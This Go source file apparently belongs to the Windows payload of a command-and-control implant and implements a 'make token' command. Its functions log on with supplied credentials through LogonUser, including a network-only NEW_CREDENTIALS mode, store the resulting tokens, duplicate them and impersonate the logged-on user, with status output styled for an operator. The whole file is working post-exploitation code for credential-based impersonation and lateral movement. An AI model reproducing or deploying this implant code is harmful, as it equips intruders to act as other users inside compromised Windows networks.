// server/docker/payloads/Windows/action_make_token_windows.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// MakeTokenCommand handles Windows token creation with credentials (kept for delegation from TokenCommand)
type MakeTokenCommand struct{}

func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, password string, tokenName string, logonTypeStr string) CommandResult {
	var output strings.Builder

	// Parse domain\user or just user
	var domain, user string
	if strings.Contains(userStr, "\\") {
		parts := strings.SplitN(userStr, "\\", 2)
		domain = parts[0]
		user = parts[1]
	} else if strings.Contains(userStr, "@") {
		// UPN format
		user = userStr
		domain = ""
	} else {
		// Local user
		user = userStr
		domain = "."
	}

	// Map logon type string to constant
	logonType := LOGON32_LOGON_INTERACTIVE
	switch strings.ToLower(logonTypeStr) {
	case "network":
		logonType = LOGON32_LOGON_NETWORK
	case "batch":
		logonType = LOGON32_LOGON_BATCH
	case "service":
		logonType = LOGON32_LOGON_SERVICE
	case "network_cleartext", "network_clear":
		logonType = LOGON32_LOGON_NETWORK_CLEARTEXT
	case "new_credentials", "newcreds":
		logonType = LOGON32_LOGON_NEW_CREDENTIALS
	case "interactive":
		logonType = LOGON32_LOGON_INTERACTIVE
	default:
		logonType = LOGON32_LOGON_INTERACTIVE
	}

	output.WriteString("=== Creating Token ===\n")
	output.WriteString(fmt.Sprintf("User: %s\\%s\n", domain, user))
	output.WriteString(fmt.Sprintf("Logon Type: %s\n", logonTypeStr))
	output.WriteString(fmt.Sprintf("Token Name: %s\n", tokenName))

	// Convert strings to UTF16
	userUTF16, err := syscall.UTF16PtrFromString(user)
	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Failed to convert username: %v", err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	domainUTF16, err := syscall.UTF16PtrFromString(domain)
	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Failed to convert domain: %v", err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	passwordUTF16, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Failed to convert password: %v", err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Call LogonUser
	var token syscall.Handle
	ret, _, lastErr := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userUTF16)),
		uintptr(unsafe.Pointer(domainUTF16)),
		uintptr(unsafe.Pointer(passwordUTF16)),
		uintptr(logonType),
		uintptr(LOGON32_PROVIDER_DEFAULT),
		uintptr(unsafe.Pointer(&token)),
	)

	if ret == 0 {
		errorCode := lastErr.(syscall.Errno)
		errorMsg := c.getLogonErrorMessage(errorCode)
		output.WriteString(fmt.Sprintf("[!] LogonUser failed: %s (0x%X)\n", errorMsg, errorCode))
		return CommandResult{
			Output:      output.String(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Successfully created token
	output.WriteString("[+] Token created successfully!\n")

	// Get token information
	userName, userDomain := c.getTokenUserInfo(token)
	output.WriteString(fmt.Sprintf("    Token User: %s\\%s\n", userDomain, userName))

	// Store token in unified store
	if globalTokenStore == nil {
		globalTokenStore = &UnifiedTokenStore{
			Tokens:   make(map[string]syscall.Handle),
			Metadata: make(map[string]TokenMetadata),
		}
	}

	globalTokenStore.mu.Lock()

	// Close existing token with same name if it exists
	if existingToken, exists := globalTokenStore.Tokens[tokenName]; exists {
		CloseHandle(existingToken)
	}

	// Store the token
	globalTokenStore.Tokens[tokenName] = token
	globalTokenStore.Metadata[tokenName] = TokenMetadata{
		User:      user,
		Domain:    domain,
		Source:    "created",
		LogonType: logonTypeStr,
		StoredAt:  time.Now(),
		TokenType: "primary",
		NetOnly:   false,
	}

	// Save original user info if not already saved
	if globalTokenStore.OriginalUser == "" {
		originalUser, originalDomain := c.getCurrentUserInfo()
		globalTokenStore.OriginalUser = originalUser
		globalTokenStore.OriginalDomain = originalDomain
	}

	globalTokenStore.mu.Unlock()

	output.WriteString(fmt.Sprintf("    Token stored as: %s\n", tokenName))

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr string, password string, tokenName string) CommandResult {
	var output strings.Builder

	// Parse domain\user
	var domain, user string
	if strings.Contains(userStr, "\\") {
		parts := strings.SplitN(userStr, "\\", 2)
		domain = parts[0]
		user = parts[1]
	} else {
		user = userStr
		domain = "."
	}

	output.WriteString("=== Creating Network-Only Token ===\n")
	output.WriteString(fmt.Sprintf("User: %s\\%s\n", domain, user))
	output.WriteString(fmt.Sprintf("Token Name: %s\n", tokenName))
	output.WriteString("Mode: Network-Only (NEW_CREDENTIALS)\n")

	// Convert strings to UTF16
	userUTF16, err := syscall.UTF16PtrFromString(user)
	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Failed to convert username: %v", err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	domainUTF16, err := syscall.UTF16PtrFromString(domain)
	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Failed to convert domain: %v", err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	passwordUTF16, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Failed to convert password: %v", err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Call LogonUser with NEW_CREDENTIALS
	var token syscall.Handle
	ret, _, lastErr := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userUTF16)),
		uintptr(unsafe.Pointer(domainUTF16)),
		uintptr(unsafe.Pointer(passwordUTF16)),
		uintptr(LOGON32_LOGON_NEW_CREDENTIALS),
		uintptr(LOGON32_PROVIDER_DEFAULT),
		uintptr(unsafe.Pointer(&token)),
	)

	if ret == 0 {
		errorCode := lastErr.(syscall.Errno)
		errorMsg := c.getLogonErrorMessage(errorCode)
		output.WriteString(fmt.Sprintf("[!] LogonUser failed: %s (0x%X)\n", errorMsg, errorCode))
		return CommandResult{
			Output:      output.String(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	output.WriteString("[+] Network-only token created successfully!\n")

	// Store token
	if globalTokenStore == nil {
		globalTokenStore = &UnifiedTokenStore{
			Tokens:   make(map[string]syscall.Handle),
			Metadata: make(map[string]TokenMetadata),
		}
	}

	globalTokenStore.mu.Lock()

	if existingToken, exists := globalTokenStore.Tokens[tokenName]; exists {
		CloseHandle(existingToken)
	}

	globalTokenStore.Tokens[tokenName] = token
	globalTokenStore.Metadata[tokenName] = TokenMetadata{
		User:      user,
		Domain:    domain,
		Source:    "created",
		LogonType: "new_credentials",
		StoredAt:  time.Now(),
		TokenType: "primary",
		NetOnly:   true, // Mark as network-only
	}

	if globalTokenStore.OriginalUser == "" {
		originalUser, originalDomain := c.getCurrentUserInfo()
		globalTokenStore.OriginalUser = originalUser
		globalTokenStore.OriginalDomain = originalDomain
	}

	globalTokenStore.mu.Unlock()

	output.WriteString(fmt.Sprintf("    Token stored as: %s\n", tokenName))
	output.WriteString("    This token will only affect network operations\n")

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
	if globalTokenStore == nil {
		return CommandResult{
			Output:      "No tokens available",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	globalTokenStore.mu.RLock()

	// Find the most recent "created" token that is NOT netonly
	var foundToken syscall.Handle
	var foundName string

	for name, metadata := range globalTokenStore.Metadata {
		if metadata.Source == "created" && !metadata.NetOnly {
			if token, exists := globalTokenStore.Tokens[name]; exists {
				foundToken = token
				foundName = name
				break
			}
		}
	}
	globalTokenStore.mu.RUnlock()

	if foundToken == 0 {
		return CommandResult{
			Output:      "No impersonatable created token found",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Get current user before impersonation
	currentUser, currentDomain := c.getCurrentUserInfo()

	// Revert any current impersonation first
	RevertToSelf()

	// Duplicate as impersonation token
	var impersonationToken syscall.Handle
	err := DuplicateTokenEx(
		foundToken,
		TOKEN_ALL_ACCESS,
		nil,
		SecurityImpersonation,
		TokenImpersonation,
		&impersonationToken,
	)
	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Failed to duplicate token: %v", err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer CloseHandle(impersonationToken)

	// Impersonate the token
	err = ImpersonateLoggedOnUser(impersonationToken)
	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Failed to impersonate token: %v", err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Update global state
	globalTokenStore.mu.Lock()
	globalTokenStore.IsImpersonating = true
	globalTokenStore.ActiveToken = foundName
	globalTokenStore.mu.Unlock()

	// Get actual impersonated user
	var threadToken syscall.Token
	OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
	if threadToken != 0 {
		defer threadToken.Close()
		newUser, newDomain := c.getTokenUserInfo(syscall.Handle(threadToken))

		var output strings.Builder
		output.WriteString("[+] Impersonation successful!\n")
		output.WriteString(fmt.Sprintf("    Previous: %s\\%s\n", currentDomain, currentUser))
		output.WriteString(fmt.Sprintf("    Current: %s\\%s\n", newDomain, newUser))
		output.WriteString(fmt.Sprintf("    Token: %s\n", foundName))

		return CommandResult{
			Output:      output.String(),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      "[+] Token impersonated",
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *MakeTokenCommand) clearTokens(ctx *CommandContext) CommandResult {
	if globalTokenStore == nil {
		return CommandResult{
			Output:      "No tokens to clear",
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	globalTokenStore.mu.Lock()
	defer globalTokenStore.mu.Unlock()

	// Find and remove all "created" tokens
	var clearedCount int

	for name, metadata := range globalTokenStore.Metadata {
		if metadata.Source == "created" {
			// Check if this is the active network-only token
			if globalTokenStore.NetOnlyToken == name {
				globalTokenStore.NetOnlyToken = ""
				globalTokenStore.NetOnlyHandle = 0
			}

			// Check if this is the active impersonation token
			if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken == name {
				RevertToSelf()
				globalTokenStore.IsImpersonating = false
				globalTokenStore.ActiveToken = ""
			}

			if token, exists := globalTokenStore.Tokens[name]; exists {
				CloseHandle(token)
				delete(globalTokenStore.Tokens, name)
				delete(globalTokenStore.Metadata, name)
				clearedCount++
			}
		}
	}

	if clearedCount == 0 {
		return CommandResult{
			Output:      "No created tokens to clear",
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      fmt.Sprintf("[+] Cleared %d created token(s)", clearedCount),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// Helper functions
func (c *MakeTokenCommand) getCurrentUserInfo() (string, string) {
	token, err := syscall.OpenCurrentProcessToken()
	if err == nil {
		defer token.Close()
		if user, domain := c.getTokenUserInfo(syscall.Handle(token)); user != "Unknown" {
			return user, domain
		}
	}
	return "Unknown", "Unknown"
}

func (c *MakeTokenCommand) getTokenUserInfo(token syscall.Handle) (string, string) {
	var needed uint32
	procGetTokenInformation.Call(
		uintptr(token),
		1, // TokenUser
		0,
		0,
		uintptr(unsafe.Pointer(&needed)),
	)

	if needed == 0 {
		return "Unknown", ""
	}

	buffer := make([]byte, needed)
	ret, _, _ := procGetTokenInformation.Call(
		uintptr(token),
		1, // TokenUser
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(needed),
		uintptr(unsafe.Pointer(&needed)),
	)

	if ret == 0 {
		return "Unknown", ""
	}

	tokenUser := (*TokenUser)(unsafe.Pointer(&buffer[0]))

	var nameSize, domainSize uint32 = 256, 256
	nameBuffer := make([]uint16, nameSize)
	domainBuffer := make([]uint16, domainSize)
	var use uint32

	ret, _, _ = procLookupAccountSidW.Call(
		0,
		uintptr(unsafe.Pointer(tokenUser.User.Sid)),
		uintptr(unsafe.Pointer(&nameBuffer[0])),
		uintptr(unsafe.Pointer(&nameSize)),
		uintptr(unsafe.Pointer(&domainBuffer[0])),
		uintptr(unsafe.Pointer(&domainSize)),
		uintptr(unsafe.Pointer(&use)),
	)

	if ret == 0 {
		return "Unknown", ""
	}

	return syscall.UTF16ToString(nameBuffer), syscall.UTF16ToString(domainBuffer)
}

func (c *MakeTokenCommand) getLogonErrorMessage(errorCode syscall.Errno) string {
	// Common logon error codes
	switch errorCode {
	case 0x52E:
		return "Logon failure: unknown user name or bad password"
	case 0x52F:
		return "Account restriction: account disabled, expired, or locked"
	case 0x530:
		return "Invalid logon hours"
	case 0x531:
		return "Account restriction: user not allowed to log on at this computer"
	case 0x532:
		return "Account disabled"
	case 0x533:
		return "Account has expired"
	case 0x534:
		return "User not allowed to log on at this computer"
	case 0x535:
		return "The specified account's password has expired"
	case 0x536:
		return "The NetLogon component is not active"
	case 0x537:
		return "Account locked out"
	case 0x569:
		return "Logon failure: user not granted the requested logon type"
	case 0x56A:
		return "Logon failure: the specified account password has expired"
	case 0x56B:
		return "Logon failure: user not allowed to log on from this computer"
	case 0x6F7:
		return "The domain controller is not available"
	case 0x773:
		return "The user's password must be changed"
	case 0x774:
		return "The user's password has been reset by administrator"
	default:
		return fmt.Sprintf("Windows error 0x%X", errorCode)
	}
}
